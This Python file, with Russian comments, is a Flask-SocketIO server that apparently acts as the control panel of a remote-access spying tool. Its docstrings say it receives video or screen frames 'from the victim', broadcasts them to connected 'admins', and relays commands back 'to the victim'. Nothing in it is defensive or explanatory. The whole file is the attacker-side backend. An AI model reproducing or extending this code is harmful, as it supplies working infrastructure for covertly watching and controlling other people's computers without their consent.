from flask import Flask, render_template
from flask_socketio import SocketIO, emit
import base64
import json

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Храним последний кадр
current_frame = None

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_connect():
    print('[+] Клиент подключился')
    emit('status', {'status': 'connected'})

@socketio.on('frame')
def handle_frame(data):
    """Принимает кадр от жертвы через WebSocket"""
    global current_frame
    current_frame = data
    # Отправляем ВСЕМ админам
    emit('frame', data, broadcast=True, include_self=False)

@socketio.on('command')
def handle_command(data):
    """Отправляет команду жертве"""
    emit('command', data, broadcast=True)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
